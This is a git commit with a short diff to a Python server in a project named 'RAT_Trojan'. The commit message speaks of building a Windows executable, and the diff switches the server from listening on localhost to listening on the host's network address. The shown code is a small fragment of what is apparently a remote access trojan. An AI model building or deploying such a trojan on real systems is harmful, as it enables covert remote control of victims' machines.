96b3e2622744dddcf90ce3c3414c45608a4819f8
MRegra <marregsil97@gmail.com>
2021-03-29 14:48:09 +0200

    Create a .exe to run on windows

--- Security_Projects/RAT_Trojan/server.py
+++ Security_Projects/RAT_Trojan/server.py
@@ -2,7 +2,10 @@ import socket
 import os
 import subprocess
 
-HOST = '127.0.0.1'  # Standard loopback interface address (localhost)
+hostname = socket.gethostname()
+local_ip = socket.gethostbyname(hostname)
+
+HOST = local_ip     # Standard loopback interface address (localhost)
 PORT = 65432        # Port to listen on (non-privileged ports are > 1023)
 
 def options(command):
